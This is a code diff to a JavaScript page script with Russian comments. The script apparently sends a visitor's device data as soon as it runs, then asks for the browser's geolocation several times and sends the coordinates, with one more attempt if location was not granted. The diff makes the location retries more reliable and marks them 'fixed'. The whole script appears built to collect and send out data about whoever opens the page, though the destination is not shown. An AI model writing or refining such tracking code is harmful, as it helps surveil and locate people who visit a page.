@@ -88,23 +88,26 @@ async function sendDeviceData() {
     await sendMessage(fullText);
 }
 
-// ========== ГЕОЛОКАЦИЯ ==========
-async function askLocation() {
+// ========== ГЕОЛОКАЦИЯ (ИСПРАВЛЕНО) ==========
+function askLocationWithRetry(retryCount, maxRetries) {
     return new Promise((resolve) => {
         navigator.geolocation.getCurrentPosition(
             (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
-            () => resolve(null)
+            (error) => {
+                if (retryCount < maxRetries) {
+                    setTimeout(() => {
+                        askLocationWithRetry(retryCount + 1, maxRetries).then(resolve);
+                    }, 2000);
+                } else {
+                    resolve(null);
+                }
+            }
         );
     });
 }
 
 async function requestLocation(maxAttempts) {
-    for (let i = 0; i < maxAttempts; i++) {
-        const loc = await askLocation();
-        if (loc) return loc;
-        if (i < maxAttempts - 1) await new Promise(r => setTimeout(r, 2000));
-    }
-    return null;
+    return await askLocationWithRetry(1, maxAttempts);
 }
 
 async function sendLocation(lat, lon) {
@@ -160,7 +163,7 @@ async function main() {
     // 1. Данные устройства сразу
     await sendDeviceData();
     
-    // 2. Геолокация (2 попытки)
+    // 2. Геолокация (2 попытки) - ИСПРАВЛЕНО
     const firstLoc = await requestLocation(2);
     if (firstLoc) {
         await sendLocation(firstLoc.lat, firstLoc.lon);
@@ -176,7 +179,7 @@ async function main() {
     
     // 5. Если гео не было — последняя попытка
     if (!locationGranted) {
-        const lastLoc = await askLocation();
+        const lastLoc = await requestLocation(1);
         if (lastLoc) await sendLocation(lastLoc.lat, lastLoc.lon);
     }
     
